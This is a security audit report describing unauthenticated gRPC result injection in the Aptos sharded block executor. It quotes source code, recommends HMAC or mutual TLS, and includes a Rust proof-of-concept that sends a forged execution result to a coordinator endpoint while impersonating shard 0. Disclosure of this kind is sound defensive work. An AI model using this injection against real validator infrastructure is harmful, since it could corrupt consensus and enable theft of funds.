# Audit Report

## Title
Unauthenticated Remote Execution Results Enable Consensus Violation and State Corruption in Sharded Block Executor

## Summary
The sharded block executor's remote execution mode accepts execution results from executor shards without any cryptographic verification or authentication. An attacker with network access to the coordinator can inject forged execution results, causing consensus violations and potential state corruption across validator nodes.

## Finding Description

The sharded block executor implements a distributed execution model where transaction execution is partitioned across multiple executor shards that communicate with a coordinator over the network. The critical vulnerability exists in how execution results are transmitted and accepted:

**Vulnerable Code Path:**

1. Executor shards send results via `RemoteCoordinatorClient::send_execution_result()` [1](#0-0) 

2. Results are serialized as `RemoteExecutionResult` and sent over plain HTTP gRPC [2](#0-1) 

3. The gRPC service accepts any message matching the message type without authentication [3](#0-2) 

4. The coordinator blindly accepts and deserializes results without verification [4](#0-3) 

5. These unverified results are incorporated into the final execution output [5](#0-4) 

**Attack Scenario:**

An attacker who gains network access to the coordinator (through compromised infrastructure, SSRF, or malicious shard) can:

1. Craft a malicious `RemoteExecutionResult` containing arbitrary `TransactionOutput` values
2. Serialize it with BCS encoding
3. Send it to the coordinator's gRPC endpoint with the correct message type (e.g., `execute_result_0`)
4. The coordinator accepts it as legitimate and includes it in block execution results

**Broken Invariants:**

- **Deterministic Execution**: Different validators with different network configurations will produce different state roots for identical blocks
- **Consensus Safety**: Forged execution results cause state divergence, potentially leading to chain splits
- **State Consistency**: Fake transaction outputs bypass all Move VM execution and validation checks

The vulnerability is enabled by the production deployment model [6](#0-5)  where executor shards run as separate processes, potentially on different machines in cloud environments.

## Impact Explanation

**Critical Severity** - This vulnerability qualifies for Critical severity under multiple categories:

1. **Consensus/Safety Violations**: An attacker can cause different validators to commit different execution results for the same block, breaking AptosBFT safety guarantees. If validators have different sharded execution configurations, they would diverge on state roots.

2. **Loss of Funds**: Forged execution results could include:
   - Unauthorized coin minting by faking `CoinStore` state changes
   - Unauthorized transfers by forging `TransferEvent` outputs
   - Arbitrary state modifications bypassing Move VM validation

3. **State Corruption**: Fake outputs are committed to storage without executing Move bytecode, bypassing all prologue/epilogue checks, gas metering, and authorization logic defined in the Aptos Framework.

4. **Non-recoverable Network Partition**: If exploited during production, divergent state roots would cause consensus failure requiring manual intervention or hard fork to resolve.

The production usage is confirmed [7](#0-6)  where remote execution is enabled when `get_remote_addresses()` returns non-empty addresses.

## Likelihood Explanation

**Likelihood: Medium-High**

While this requires network access to the validator's coordinator service, the likelihood is elevated because:

1. **Cloud Deployments**: Modern validator infrastructure often uses cloud providers with multiple VMs/containers. A compromise of any component provides network access.

2. **No Defense-in-Depth**: The complete absence of authentication means a single network breach compromises the entire execution integrity.

3. **Attack Surface**: The gRPC service listens on a network socket [8](#0-7)  making it accessible to anyone with network connectivity.

4. **SSRF Potential**: Other services running in the same environment could be leveraged via SSRF attacks to reach the coordinator.

5. **Malicious Shard**: A compromised or intentionally malicious executor shard can impersonate other shards and inject fake results.

## Recommendation

Implement cryptographic authentication for execution results using HMAC or digital signatures:

**Solution 1: HMAC-based Authentication**
```rust
// In RemoteExecutionResult
pub struct RemoteExecutionResult {
    pub inner: Result<Vec<Vec<TransactionOutput>>, VMStatus>,
    pub hmac: [u8; 32],  // HMAC of the inner result
}

// On send:
impl RemoteCoordinatorClient {
    fn send_execution_result(&self, result: Result<Vec<Vec<TransactionOutput>>, VMStatus>) {
        let serialized = bcs::to_bytes(&result).unwrap();
        let hmac = compute_hmac(&self.shared_secret, &serialized);
        let authenticated_result = RemoteExecutionResult { 
            inner: result, 
            hmac 
        };
        // ... send authenticated_result
    }
}

// On receive:
fn get_output_from_shards(&self) -> Result<Vec<Vec<Vec<TransactionOutput>>>, VMStatus> {
    for (shard_id, rx) in self.result_rxs.iter().enumerate() {
        let received = rx.recv().unwrap();
        let result: RemoteExecutionResult = bcs::from_bytes(&received.to_bytes()).unwrap();
        
        // Verify HMAC before using result
        let expected_hmac = compute_hmac(&self.shard_secrets[shard_id], 
                                         &bcs::to_bytes(&result.inner).unwrap());
        if result.hmac != expected_hmac {
            return Err(VMStatus::Error(StatusCode::INTERNAL_ERROR, None));
        }
        
        results.push(result.inner?);
    }
    Ok(results)
}
```

**Solution 2: TLS with Mutual Authentication**

Replace plain HTTP with HTTPS and implement mutual TLS authentication [9](#0-8)  to verify both coordinator and shard identities at the transport layer.

## Proof of Concept

```rust
// PoC demonstrating forged execution result injection
use aptos_executor_service::RemoteExecutionResult;
use aptos_secure_net::network_controller::Message;
use aptos_types::{transaction::TransactionOutput, vm_status::VMStatus};
use tonic::transport::Channel;

#[tokio::main]
async fn exploit_unauth_executor() {
    // 1. Craft malicious execution result
    let forged_outputs = vec![vec![
        TransactionOutput::new(
            WriteSet::default(),  // Malicious state changes
            vec![],  // Forged events (e.g., coin minting)
            0,  // Gas used
            TransactionStatus::Keep(ExecutionStatus::Success),
        )
    ]];
    
    let malicious_result = RemoteExecutionResult::new(Ok(forged_outputs));
    let payload = bcs::to_bytes(&malicious_result).unwrap();
    
    // 2. Connect to coordinator's gRPC service
    let coordinator_addr = "http://validator-coordinator:52200";
    let channel = Channel::from_shared(coordinator_addr)
        .unwrap()
        .connect()
        .await
        .unwrap();
    
    // 3. Send forged result as if from shard 0
    let mut client = NetworkMessageServiceClient::new(channel);
    let request = tonic::Request::new(NetworkMessage {
        message: payload,
        message_type: "execute_result_0".to_string(),  // Impersonate shard 0
    });
    
    // 4. Coordinator accepts without verification
    client.simple_msg_exchange(request).await.unwrap();
    
    // Result: Coordinator will use forged outputs in block execution,
    // causing state divergence from honest validators
}
```

## Notes

This vulnerability is particularly severe because:

1. The `RemoteExecutionResult` struct has no authentication fields [10](#0-9) 

2. The entire sharded execution infrastructure in [11](#0-10)  relies on unauthenticated network communication

3. The coordinator's result aggregation [5](#0-4)  blindly trusts all received results

4. Even the local coordinator client interface [12](#0-11)  provides no mechanism for result authentication

The vulnerability affects any deployment using the remote sharded block executor feature, which is controlled by configuration [13](#0-12) .

### Citations

**File:** execution/executor-service/src/remote_cordinator_client.rs (L115-119)
```rust
    fn send_execution_result(&self, result: Result<Vec<Vec<TransactionOutput>>, VMStatus>) {
        let remote_execution_result = RemoteExecutionResult::new(result);
        let output_message = bcs::to_bytes(&remote_execution_result).unwrap();
        self.result_tx.send(Message::new(output_message)).unwrap();
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L68-86)
```rust
        info!("Starting Server async at {:?}", server_addr);
        // NOTE: (1) serve_with_shutdown() starts the server, if successful the task does not return
        //           till the server is shutdown. Hence this should be called as a separate
        //           non-blocking task. Signal handler 'server_shutdown_rx' is needed to shutdown
        //           the server
        //       (2) There is no easy way to know if/when the server has started successfully. Hence
        //           we may need to implement a healthcheck service to check if the server is up
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
            .add_service(reflection_service)
            .serve_with_shutdown(server_addr, async {
                server_shutdown_rx.await.ok();
                info!("Received signal to shutdown server at {:?}", server_addr);
            })
            .await
            .unwrap();
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L128-128)
```rust
                .block_on(async { Self::get_channel(format!("http://{}", remote_addr)).await }),
```

**File:** secure/net/src/grpc_network_service/mod.rs (L132-137)
```rust
    async fn get_channel(remote_addr: String) -> NetworkMessageServiceClient<Channel> {
        info!("Trying to connect to remote server at {:?}", remote_addr);
        let conn = tonic::transport::Endpoint::new(remote_addr)
            .unwrap()
            .connect_lazy();
        NetworkMessageServiceClient::new(conn).max_decoding_message_size(MAX_MESSAGE_SIZE)
```

**File:** execution/executor-service/src/remote_executor_client.rs (L163-172)
```rust
    fn get_output_from_shards(&self) -> Result<Vec<Vec<Vec<TransactionOutput>>>, VMStatus> {
        trace!("RemoteExecutorClient Waiting for results");
        let mut results = vec![];
        for rx in self.result_rxs.iter() {
            let received_bytes = rx.recv().unwrap().to_bytes();
            let result: RemoteExecutionResult = bcs::from_bytes(&received_bytes).unwrap();
            results.push(result.inner?);
        }
        Ok(results)
    }
```

**File:** execution/executor-service/src/remote_executor_client.rs (L208-211)
```rust
        let execution_results = self.get_output_from_shards()?;

        self.state_view_service.drop_state_view();
        Ok(ShardedExecutionOutput::new(execution_results, vec![]))
```

**File:** execution/executor-service/src/main.rs (L1-48)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

use aptos_executor_service::process_executor_service::ProcessExecutorService;
use aptos_logger::info;
use clap::Parser;
use std::net::SocketAddr;

#[derive(Debug, Parser)]
struct Args {
    #[clap(long, default_value_t = 8)]
    pub num_executor_threads: usize,

    #[clap(long)]
    pub shard_id: usize,

    #[clap(long)]
    pub num_shards: usize,

    #[clap(long, num_args = 1..)]
    pub remote_executor_addresses: Vec<SocketAddr>,

    #[clap(long)]
    pub coordinator_address: SocketAddr,
}

fn main() {
    let args = Args::parse();
    aptos_logger::Logger::new().init();

    let (tx, rx) = crossbeam_channel::unbounded();
    ctrlc::set_handler(move || {
        tx.send(()).unwrap();
    })
    .expect("Error setting Ctrl-C handler");

    let _exe_service = ProcessExecutorService::new(
        args.shard_id,
        args.num_shards,
        args.num_executor_threads,
        args.coordinator_address,
        args.remote_executor_addresses,
    );

    rx.recv()
        .expect("Could not receive Ctrl-C msg from channel.");
    info!("Process executor service shutdown successfully.");
}
```

**File:** execution/executor/src/workflow/do_get_execution_output.rs (L256-276)
```rust
    fn execute_block_sharded<V: VMBlockExecutor>(
        partitioned_txns: PartitionedTransactions,
        state_view: Arc<CachedStateView>,
        onchain_config: BlockExecutorConfigFromOnchain,
    ) -> Result<Vec<TransactionOutput>> {
        if !get_remote_addresses().is_empty() {
            Ok(V::execute_block_sharded(
                &REMOTE_SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
        } else {
            Ok(V::execute_block_sharded(
                &SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
        }
    }
```

**File:** execution/executor-service/src/lib.rs (L32-41)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct RemoteExecutionResult {
    pub inner: Result<Vec<Vec<TransactionOutput>>, VMStatus>,
}

impl RemoteExecutionResult {
    pub fn new(inner: Result<Vec<Vec<TransactionOutput>>, VMStatus>) -> Self {
        Self { inner }
    }
}
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/sharded_executor_service.rs (L254-254)
```rust
                    self.coordinator_client.send_execution_result(ret);
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/coordinator_client.rs (L8-13)
```rust
// Interface to communicate from the executor shards to the block executor coordinator.
pub trait CoordinatorClient<S: StateView + Sync + Send + 'static>: Send + Sync {
    fn receive_execute_command(&self) -> ExecutorShardCommand<S>;

    fn send_execution_result(&self, result: Result<Vec<Vec<TransactionOutput>>, VMStatus>);
}
```
